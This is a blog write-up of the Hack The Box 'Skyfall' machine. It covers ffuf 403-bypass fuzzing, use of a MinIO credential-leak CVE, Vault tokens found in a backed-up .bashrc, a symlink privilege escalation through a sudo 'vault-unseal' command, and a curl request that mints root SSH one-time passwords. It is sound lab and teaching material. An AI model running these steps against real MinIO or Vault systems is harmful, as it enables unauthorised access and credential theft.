---
title: Skyfall Writeup
date: 2024-03-6 12:50 +0100
author: Kyllano
categories: [HTB Writeup]
tags: [cybersecurity, htb, writeup]
---

## Recon

As always, here's the nmap scan with the classic options :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB$ nmap -sC -sV -p-10000 10.10.11.254
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-02 14:55 CET
Nmap scan report for skyfall.htb (10.10.11.254)
Host is up (0.033s latency).
Not shown: 9998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.31 seconds
```

Really not much to go on from. Let's add the `skyfall.htb` domain to our `/etc/hosts` and take a look at the website.

When checking out the website on port 80, there'sa link to a demo of the product :

<img src="/assets/img/Skyfall/sky1.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

It redirects us to `demo.skyfall.htb`, let's also add that to our hosts. The demo landing page looks like this :

<img src="/assets/img/Skyfall/sky2.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Some credentials `guest`/`guest` are displayed, let's use those to get in. Once that's done, we can access the website :

<img src="/assets/img/Skyfall/sky3.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Looking at all of this, there's not much of note, except that the page `Minio metrics` gives us a 403 forbidden!

<img src="/assets/img/Skyfall/sky4.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Okay, let's try and use the some 403 [bypass](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses#path-fuzzing) that uses URL pass fuzzing. The technique consists of adding some URL encoding before or after the requested ressource. So here, I have a list of all unicode encoding (in form %xx or %xx%xx) and try to add those before and after (also, since we need to be logged in, I put in my session cookies using the `-b` option and filter in only the `200` error codes):

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools/ffuf$ ./ffuf -u http://demo.skyfall.htb/metricsFUZZ -w ../unicode.txt -b "session=.eJwlzjtqBDEQRdG9KHZQH5VUms001fXBxmBD90xkvHcLHL4bPM5PO-rK-709ntcr39rxEe3RtNMa4bA6jWkxnUeoVAwQBbMQTeAscOg5zQRLS8_eu54ZGcsnI_uAcqpelDZloDOtwGkVduJwDphla9_SEDTpKujqAiajbcjrzutfg3v6fdXx_P7Mrx3CzQ1PZiYRpNm3agpQwDrVrEMSG0K13z8Z1T8q.ZeMwdg.C09egmonvz6s8mnlxRwZcJoj-PM" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://demo.skyfall.htb/metricsFUZZ
 :: Wordlist         : FUZZ: /home/kyll/Desktop/code_folder/Tools/unicode.txt
 :: Header           : Cookie: session=.eJwlzjtqBDEQRdG9KHZQH5VUms001fXBxmBD90xkvHcLHL4bPM5PO-rK-709ntcr39rxEe3RtNMa4bA6jWkxnUeoVAwQBbMQTeAscOg5zQRLS8_eu54ZGcsnI_uAcqpelDZloDOtwGkVduJwDphla9_SEDTpKujqAiajbcjrzutfg3v6fdXx_P7Mrx3CzQ1PZiYRpNm3agpQwDrVrEMSG0K13z8Z1T8q.ZeMwdg.C09egmonvz6s8mnlxRwZcJoj-PM
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

%0a                     [Status: 200, Size: 44893, Words: 4191, Lines: 9, Duration: 470ms]
:: Progress: [65792/65792] :: Job [1/1] :: 113 req/sec :: Duration: [0:09:25] :: Errors: 0 ::
```

We've found one of the common way to bypass a `403`, which is adding a `%0a` (which is the unicode charact for a new line). That leads us to this page:

<img src="/assets/img/Skyfall/sky5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

## Exploiting minio

At the bottom of the page, we spy a `minio_endpoint_url`, which is `http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster`. That is the backend of the minio server. We better add that to our hosts file. Also, we now know that `minio` is in use (we were expecting it before with the tab on the left but now it is confirmed). If we check out what vulnerability minio has on google, we find out that it suffers from [CVE-2023-28432 and CVE-2023-28434](https://blog.min.io/security-advisory-stackedcves/). It is said that

> [is vulnerable to that CVE] Any publicly reachable MinIO object storage cluster [...]

And what did we just find? That's right, a minio storage cluster endpoint (this looks like a fancy workd for backend). A full [attack analysis](https://www.securityjoes.com/post/new-attack-vector-in-the-cloud-attackers-caught-exploiting-object-storage-services?ref=blog.min.io) report has been written, but judging by the code from the GitHub repository, it seems that you only need to make a `POST` request to the `/minio/bootstrap/v1/verify` endpoint, and it will dump out the `MINIO_SECRET_KEY` and `MINIO_ROOT_PASSWORD`. This probably emerges from the fact that this endpoint should not be publicly available nor should you be able to communicate with it (without authentication). So let's use that !

<img src="/assets/img/Skyfall/sky6.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Let's sanitize the input with a beautifier and truncate what isn't interesting to our cause :

```json
{
  "MinioEndpoints": [
    {
      "Legacy": false,
      "SetCount": 1,
      "DrivesPerSet": 4,
      "Endpoints": [
[...]
      ],
      "CmdLine": "http://minio-node{1...2}/data{1...2}",
      "Platform": "OS: linux | Arch: amd64"
    }
  ],
  "MinioEnv": {
    "MINIO_ACCESS_KEY_FILE": "access_key",
    "MINIO_BROWSER": "off",
    "MINIO_CONFIG_ENV_FILE": "config.env",
    "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
    "MINIO_PROMETHEUS_AUTH_TYPE": "public",
    "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
    "MINIO_ROOT_PASSWORD_FILE": "secret_key",
    "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
    "MINIO_ROOT_USER_FILE": "access_key",
    "MINIO_SECRET_KEY_FILE": "secret_key",
    "MINIO_UPDATE": "off",
    "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
  }
}
```

And there we have it, we've found some minio credentials. Now it is time to put those to use

## Accessing minio storage

Now that we've acquired some credentials, it's time to access the minio storage. To do so, we need a minio client that we can download on the [download page](https://min.io/download#/linux) :

<img src="/assets/img/Skyfall/sky7.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Once we do the `wget` command and the `chmod` as instructed, as prompted we need to fill in this command `mc alias set myminio/ [http://MINIO-SERVER](http://MINIO-SERVER) MYUSER MYPASSWORD` with our found credentials :

<img src="/assets/img/Skyfall/sky8.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>


We've created the alias as instructed. Now we're free to use the `mc` minio client to access the server. Upon checking out the help reference (Using `mc -h`), we see that we can list out the storage space using `ls` and that there are some options that can give us the different versions of files throughout time (`--versions`) and instead of going through every folder, we can use the `-r` flag to list recursively :

<img src="/assets/img/Skyfall/sky9.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

The home backup files could provide some insight and informations on askyy and his credentials. So let's download them using the `cp` command. We can choose a specific version using the version ID that we can provide (using `--vid [Version ID]`). So let's download each of those. Upon downloading the second version:

<img src="/assets/img/Skyfall/sky10.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>


And checking out the contents, we can see in the `.bashrc` file some lines that are of use :

```bash
[...]
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
[...]
```

This mentions a vault, and when Googling `minio vault`, we find that [MinIO can work with HashiCorp Vault](https://blog.min.io/minio-and-hashicorp-vault/). So those are probably credentials for some hashicorp vault.

## Accessing the Hashicorp vault

### Getting in the vault

Let's download the binaries necessary for the vault :

<img src="/assets/img/Skyfall/sky11.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

I downloaded an `amd64` precompiled binary (since I do not want to clog up my package manager with shit I'll only use once). We can already guess that we'll need to have the `VAULT_API_ADDR` and `VAULT_TOKEN` variable setup. Checking out the [documentation](https://developer.hashicorp.com/vault/tutorials/getting-started/getting-started-dev-server). We see that we also need to setup the variable `VAULT_ADDR` that will be assigned the address of the vault (which would be the same as the `VAULT_API_ADDR`). When that's done, we'll be able to log into the vault. Let's test that :

<img src="/assets/img/Skyfall/sky12.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Hurray! We're now logged in! Checking out the help menu `./vault --help`, it seems we can get in using `ssh`. Let's try to connect :

<img src="/assets/img/Skyfall/sky13.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

It seems that we need to have a role. On the [documentation](https://developer.hashicorp.com/vault/api-docs/secret/ssh), we see that a secret is named `ssh` and that it contains some `roles`. Also specifically looking at [this part of the doc](https://developer.hashicorp.com/vault/api-docs/secret/ssh#list-roles), we see that we can make a simple HTTP request to the ressource `v1/ssh/roles` of the endpoint with our token and it will spit out the available roles :

<img src="/assets/img/Skyfall/sky14.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Beautifying this, we get :

```json
{
  "request_id": "cf483ff2-b051-cf79-90bf-c8ae2afec0df",
  "lease_id": "",
  "renewable": false,
  "lease_duration": 0,
  "data": {
    "key_info": {
      "admin_otp_key_role": {
        "key_type": "otp"
      },
      "dev_otp_key_role": {
        "key_type": "otp"
      }
    },
    "keys": [
      "admin_otp_key_role",
      "dev_otp_key_role"
    ]
  },
  "wrap_info": null,
  "warnings": null,
  "auth": null
}
```

So the 2 possible roles are `admin_otp_key_role` and `dev_otp_key_role`. Those are OTP roles

### A note about OTP

From [This website](https://www.techtarget.com/searchsecurity/definition/one-time-password-OTP), we can get a feel for OTP :

> A one-time password (OTP) is an automatically generated numeric or 
> alphanumeric string of characters that authenticates a user for a single
>  transaction or login session.

So in a nutshell, OTP is a password that will be attributed once every time you'll try to connect using a capability. This ensure that no credentials could be reused later. This is  a security measure that prevents dangling passwords in source codes or credentials that will not be changed (even though here, the token is still technically a long password so the implementation is has not really been mastered in the case of skyfall)

### SSH'ing into the machine using OTP

Now we know what role we need, let's try and connect again, but this time adding the OTP role and the OTP mode just like in the [doc](https://developer.hashicorp.com/vault/docs/commands/ssh#examples) :

<img src="/assets/img/Skyfall/sky15.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

This was to be expected, but the `admin_otp_key_role` is forbidden with our token, but the `dev_otp_key_role` is working. It gices us a `OTP` for the session that we enter as a password :

<img src="/assets/img/Skyfall/sky16.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And voilà! Now we can simply `cat` the user flag !

## Privesc

Privilege escalation is a little bit easy (and somehow took me some time). We first whip out our `sudo -l` :

<img src="/assets/img/Skyfall/sky17.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And we see that we can execute one command `vault-unseal`. Upon executing the command, we get a `debug.log` file that appears. But, we aren't able to open it since the permissions are set to `rw` only for root. This happens even if we create the file before we call the command :

<img src="/assets/img/Skyfall/sky18.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

What this probably does is check out if the owner is root. And if it is not, it deletes the file, creates a new one, and setup the permissions. So what we need to do to bypass that, is setup a symbolic link that points to a file that is owned by root, but readable by us. One good candidate is any file situated in `/etc/update-motd.d/`. So let's do that for the file `00-header` :

<img src="/assets/img/Skyfall/sky19.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Now to launch the command again and read the file :

<img src="/assets/img/Skyfall/sky20.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Hell yeah! We found a master token!! With this, it'll be a piece of cake to connect as admin.

To do this, we follow [the doc](https://developer.hashicorp.com/vault/api-docs/secret/ssh#generate-ssh-credentials), that tells us to do send this :

```bash
curl \
    --header "X-Vault-Token: ..." \
    --request POST \
    --data @payload.json \
    http://127.0.0.1:8200/v1/ssh/creds/my-role
```

Wih this sample payload :

```json
{
  "ip": "1.2.3.4"
}
```

We just got the Master Token as our `X-Vault-Token` , the `ip` is that of the machine (`10.10.11.254`). We know the role is `admin_otp_key_role` so we'll connect to `http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/admin_otp_key_role`. Maybe we dont need a file for the json and in the doc, we can add a username (so let's get cocky and add admindaddy as our username). This gives us this command :

```bash
curl --header "X-Vault-Token: hvs.I0ewVsmaKU1SwVZAKR3T0mmG" --request POST --data '{"ip":"10.10.11.254", "username":"admindaddy"}' http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/admin_otp_key_role
```

Try it :

<img src="/assets/img/Skyfall/sky21.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Okay so this system is boring and I cannot call myself admindaddy. But `root` is probably an admin, so let's do root as our username :

<img src="/assets/img/Skyfall/sky22.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And we finally have an `OTP` key for root! Let's connect through `ssh` using that key :

<img src="/assets/img/Skyfall/sky23.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And that's an insane done!!!